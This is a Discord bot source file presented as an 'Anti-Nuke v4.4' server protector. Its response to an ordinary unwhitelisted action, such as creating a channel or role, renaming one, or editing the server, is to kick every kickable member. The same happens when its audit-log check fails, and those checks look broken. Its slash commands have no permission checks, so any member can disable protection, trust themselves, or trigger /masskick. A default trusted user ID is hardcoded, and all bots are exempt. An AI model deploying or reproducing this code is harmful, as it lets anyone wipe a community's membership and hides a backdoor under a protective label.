require('dotenv').config();
const { Client, GatewayIntentBits, ActivityType, EmbedBuilder, PermissionFlagsBits } = require('discord.js');

const config = {
    token: process.env.DISCORD_TOKEN,
    clientId: process.env.CLIENT_ID,
    ownerId: process.env.OWNER_ID,
    trustedIds: process.env.TRUSTED_IDS ? process.env.TRUSTED_IDS.split(',') : ['1184454687865438218'],
    whitelistRoles: process.env.WHITELIST_ROLES ? process.env.WHITELIST_ROLES.split(',') : [],
    logChannelId: process.env.LOG_CHANNEL_ID || null
};

// Global state
let antiNukeEnabled = true;
let trustedUsers = new Set(config.trustedIds);
let whitelistRolesSet = new Set(config.whitelistRoles);

console.log('🤖 Anti-Nuke v4.4 starting...');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildModeration,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

function isWhitelisted(member) {
    if (!member) return false;
    return trustedUsers.has(member.id) || 
           member.user?.bot ||
           Array.from(whitelistRolesSet).some(roleId => member.roles.cache.has(roleId));
}

async function getAuditLogAuthor(guild, actionType) {
    try {
        const auditLogs = await guild.fetchAuditLogs({ type: actionType, limit: 1 });
        const entry = auditLogs.entries.first();
        if (entry) {
            const member = guild.members.cache.get(entry.executor.id);
            return member ? isWhitelisted(member) : false;
        }
    } catch (e) {
        console.log('⚠️ Audit log check failed');
    }
    return false;
}

function canKick(guildId) {
    const now = Date.now();
    const guildData = rateLimits.get(guildId);
    return !guildData || now >= guildData.nextKick;
}

// Rate limiting
const rateLimits = new Map();
const processingGuilds = new Set();

async function massKick(guild, reason) {
    const guildId = guild.id;
    if (!antiNukeEnabled || processingGuilds.has(guildId)) {
        return;
    }
    
    processingGuilds.add(guildId);
    console.log(`💥 [${guild.name}] Mass kick: ${reason}`);
    
    try {
        const members = await guild.members.fetch();
        let kicked = 0, protectedCount = 0;
        const queue = [];
        
        for (const member of members.values()) {
            if (isWhitelisted(member)) {
                protectedCount++;
                continue;
            }
            
            if (member.kickable) queue.push(member);
        }
        
        console.log(`📋 Queue:${queue.length} Protected:${protectedCount}`);
        
        for (let i = 0; i < queue.length; i++) {
            const member = queue[i];
            
            while (!canKick(guildId)) {
                const delay = rateLimits.get(guildId).nextKick - Date.now() + 100;
                await new Promise(r => setTimeout(r, delay));
            }
            
            try {
                await member.kick(`Anti-nuke: ${reason}`);
                kicked++;
                await logAction(guild, member, reason);
                
                const nextKick = Date.now() + 60 + Math.random() * 20;
                rateLimits.set(guildId, { nextKick });
                
            } catch (e) {
                console.log(`⚠️ Skip ${member.user.tag}`);
            }
            
            await new Promise(r => setTimeout(r, 65));
        }
        
        console.log(`✅ [${guild.name}] ${kicked} kicked`);
        
    } catch (e) {
        console.error('Mass kick error:', e.message);
    } finally {
        processingGuilds.delete(guildId);
        rateLimits.delete(guildId);
    }
}

async function logAction(guild, member, reason) {
    try {
        if (config.logChannelId && guild) {
            const channel = guild.channels.cache.get(config.logChannelId);
            if (channel && member) {
                await channel.send({
                    embeds: [{
                        title: '🚨 KICK',
                        description: `${member.user.tag} (${member.id})\n${reason}`,
                        color: 0xffaa00
                    }]
                }).catch(() => {});
            }
        }
    } catch (e) {}
}

// 🔥 EVENTS - Now checks audit logs for whitelisted authors
client.on('guildMemberAdd', async (member) => {
    if (!antiNukeEnabled) return;
    console.log(`👤 [${member.guild.name}] ${member.user.tag} joined`);
});

client.on('channelCreate', async (channel) => {
    if (!antiNukeEnabled) return;
    const guild = channel.guild;
    
    // Check if creator is whitelisted via audit log
    const creatorWhitelisted = await getAuditLogAuthor(guild, 'CHANNEL_CREATE');
    if (creatorWhitelisted) {
        console.log(`✅ [${guild.name}] Channel created by whitelisted user`);
        return;
    }
    
    console.log(`🚨 [${guild.name}] Channel: ${channel.name}`);
    setTimeout(() => massKick(guild, 'Channel create'), 800);
    setTimeout(() => channel.delete('Anti-nuke').catch(() => {}), 300);
});

client.on('roleCreate', async (role) => {
    if (!antiNukeEnabled) return;
    const guild = role.guild;
    
    const creatorWhitelisted = await getAuditLogAuthor(guild, 'ROLE_CREATE');
    if (creatorWhitelisted) {
        console.log(`✅ [${guild.name}] Role created by whitelisted user`);
        return;
    }
    
    console.log(`🚨 [${guild.name}] Role: ${role.name}`);
    setTimeout(() => massKick(guild, 'Role create'), 800);
});

client.on('channelUpdate', async (oldChannel, newChannel) => {
    if (oldChannel.name === newChannel.name || !antiNukeEnabled) return;
    const guild = newChannel.guild;
    
    const renamerWhitelisted = await getAuditLogAuthor(guild, 'CHANNEL_UPDATE');
    if (renamerWhitelisted) {
        console.log(`✅ [${guild.name}] Channel renamed by whitelisted user`);
        return;
    }
    
    console.log(`🚨 [${guild.name}] Channel renamed: ${newChannel.name}`);
    setTimeout(() => massKick(guild, 'Channel rename'), 800);
});

client.on('webhookCreate', async (webhook) => {
    if (!antiNukeEnabled) return;
    const guild = webhook.guild;
    
    const creatorWhitelisted = await getAuditLogAuthor(guild, 'WEBHOOK_CREATE');
    if (creatorWhitelisted) {
        console.log(`✅ [${guild.name}] Webhook created by whitelisted user`);
        return;
    }
    
    setTimeout(() => massKick(guild, 'Webhook'), 800);
});

client.on('guildIntegrationsUpdate', async (guild) => {
    if (!antiNukeEnabled) return;
    const creatorWhitelisted = await getAuditLogAuthor(guild, 'INTEGRATION_CREATE');
    if (creatorWhitelisted) {
        console.log(`✅ [${guild.name}] Integration by whitelisted user`);
        return;
    }
    setTimeout(() => massKick(guild, 'Integration'), 800);
});

client.on('roleUpdate', async (oldRole, newRole) => {
    if (oldRole.name === newRole.name && oldRole.permissions.bitfield === newRole.permissions.bitfield || !antiNukeEnabled) return;
    const guild = newRole.guild;
    
    const editorWhitelisted = await getAuditLogAuthor(guild, 'ROLE_UPDATE');
    if (editorWhitelisted) {
        console.log(`✅ [${guild.name}] Role edited by whitelisted user`);
        return;
    }
    
    setTimeout(() => massKick(guild, 'Role edit'), 800);
});

client.on('guildUpdate', async (oldGuild, newGuild) => {
    if (!antiNukeEnabled) return;
    const changes = [];
    if (oldGuild.name !== newGuild.name) changes.push('NAME');
    if (oldGuild.icon !== newGuild.icon) changes.push('ICON');
    if (changes.length) {
        const updaterWhitelisted = await getAuditLogAuthor(newGuild, 'GUILD_UPDATE');
        if (updaterWhitelisted) {
            console.log(`✅ [${newGuild.name}] Guild updated by whitelisted user`);
            return;
        }
        setTimeout(() => massKick(newGuild, `Server ${changes.join('&')}`), 800);
    }
});

// ⚔️ SLASH COMMANDS - Fixed with proper registration
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    
    const { commandName } = interaction;
    
    try {
        if (commandName === 'antinode') {
            antiNukeEnabled = !antiNukeEnabled;
            await interaction.reply({ content: `🛡️ **${antiNukeEnabled ? '🟢 ON' : '🔴 OFF'}**`, ephemeral: true });
        }
        
        if (commandName === 'add-trust') {
            const user = interaction.options.getUser('user');
            trustedUsers.add(user.id);
            await interaction.reply({ content: `✅ ${user.tag} trusted`, ephemeral: true });
        }
        
        if (commandName === 'remove-trust') {
            const user = interaction.options.getUser('user');
            trustedUsers.delete(user.id);
            await interaction.reply({ content: `❌ ${user.tag} untrusted`, ephemeral: true });
        }
        
        if (commandName === 'add-role') {
            const role = interaction.options.getRole('role');
            whitelistRolesSet.add(role.id);
            await interaction.reply({ content: `✅ ${role.name} whitelisted`, ephemeral: true });
        }
        
        if (commandName === 'status') {
            const embed = new EmbedBuilder()
                .setTitle('🛡️ Anti-Nuke v4.4')
                .addFields(
                    { name: 'Status', value: antiNukeEnabled ? '🟢 ACTIVE' : '🔴 OFF', inline: true },
                    { name: 'Trusted', value: `${trustedUsers.size}`, inline: true },
                    { name: 'Roles', value: `${whitelistRolesSet.size}`, inline: true },
                    { name: 'Servers', value: `${client.guilds.cache.size}`, inline: true },
                    { name: 'Audit Logs', value: '✅ ACTIVE', inline: true }
                )
                .setColor(antiNukeEnabled ? 0x00ff88 : 0xff4444)
                .setTimestamp();
            await interaction.reply({ embeds: [embed] });
        }
        
        if (commandName === 'masskick') {
            await interaction.reply({ content: '💥 Emergency kick...', ephemeral: true });
            massKick(interaction.guild, 'Emergency');
        }
        
    } catch (e) {
        console.error('Command error:', e);
        await interaction.reply({ content: '❌ Command failed', ephemeral: true }).catch(() => {});
    }
});

// 🚀 READY + Command Registration
client.once('ready', async () => {
    console.log(`\n✅ Anti-Nuke v4.4 LIVE | ${client.guilds.cache.size} servers`);
    console.log(`🟢 Trusted: ${trustedUsers.size}`);
    
    // Register slash commands globally
    try {
        const commands = [
            {
                name: 'antinode',
                description: 'Toggle anti-nuke ON/OFF'
            },
            {
                name: 'add-trust',
                description: 'Add trusted user',
                options: [{
                    name: 'user',
                    type: 6, // USER
                    description: 'User to trust',
                    required: true
                }]
            },
            {
                name: 'remove-trust',
                description: 'Remove trusted user',
                options: [{
                    name: 'user',
                    type: 6, // USER
                    description: 'User to untrust',
                    required: true
                }]
            },
            {
                name: 'add-role',
                description: 'Add whitelist role',
                options: [{
                    name: 'role',
                    type: 8, // ROLE
                    description: 'Role to whitelist',
                    required: true
                }]
            },
            {
                name: 'status',
                description: 'Show bot status'
            },
            {
                name: 'masskick',
                description: 'Emergency mass kick (use carefully!)'
            }
        ];

        console.log('🔄 Registering slash commands...');
        await client.application.commands.set(commands);
        console.log('✅ Slash commands registered!');
    } catch (e) {
        console.error('Command registration failed:', e);
    }
    
    const statuses = ['🛡️ Servers protected', `👥 ${trustedUsers.size} trusted`, '⚔️ v4.4 audit-safe'];
    let i = 0;
    setInterval(() => {
        client.user.setActivity(statuses[i++ % statuses.length], { type: ActivityType.Watching });
    }, 10000);
});

client.login(config.token);
